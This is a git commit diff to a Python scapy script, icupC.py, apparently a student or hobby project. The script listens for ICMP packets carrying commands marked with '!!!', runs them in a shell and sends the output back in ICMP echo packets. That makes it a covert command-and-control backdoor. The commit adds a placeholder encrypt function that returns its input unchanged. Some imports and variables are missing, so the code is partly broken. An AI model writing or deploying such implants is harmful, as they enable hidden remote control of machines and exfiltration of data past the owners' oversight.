115aa845a63caf53804ab76ac16a15f9c9e84807
Anthony Ioppolo <20ioppolan@gmail.com>
2022-10-30 20:42:12 -0400

    done except encrpyt function

--- icupC.py
+++ icupC.py
@@ -2,36 +2,36 @@ from scapy.all import *
 from scapy.all import IP,ICMP
 from subprocess import Popen, PIPE
 
-def send_over_icmp(server, response, SSM, execute):
-    if SSM and not execute: header = "###$0"
-    elif SSM and execute: header = "###$1"
-    elif execute and not SSM: header = "###01"
-    elif not execute and not SSM: header = "###00" 
+def encrypt(response):
+    return response
+
+def send_over_icmp(server, response, SSM):
+    header = "###"
+    if SSM: response = encrypt(response)
     serverresponse = header + response
     evil = IP(dst=server)/ICMP(type=8)/(serverresponse)
     send(evil)
 
-def execute_command(server, command):
-    execute = True
+def execute_command(server, command, SSM):
     p = subprocess.Popen(command, stdout=PIPE, stderr=PIPE, shell=True)
     output, error = p.communicate()
-    send_over_icmp(server, str(output))
+    send_over_icmp(server, str(output), SSM)
 
-def reply(src, command):
-    execute = False
+def reply(src, command, SSM):
     if command == "PING":
-            send_over_icmp(src, "PONG")
+            send_over_icmp(src, "PONG", SSM)
     else:
-        send_over_icmp(src, "ACKNOWLEDGED")
+        send_over_icmp(src, "ACKNOWLEDGED", SSM)
 
 def handle(pkt):
-    SSM = True
+    SSM = True  
     src = pkt[IP].dst
     payload = str(pkt.payload)
     parsed = re.split('!{3}', payload)
     if len(parsed) == 1:
         return
     else: 
+        # Deal with useless code 
         command = parsed[1][:-1]
         if command[0] == "0" and command[1] == "0":
             SSM = False
@@ -50,9 +50,9 @@ def handle(pkt):
 
         command = command[2:]
         if execute:
-            execute_command(src, command)
+            execute_command(src, command, SSM)
         else:
-            reply(src, command)
+            reply(src, command, SSM)
     
         
 
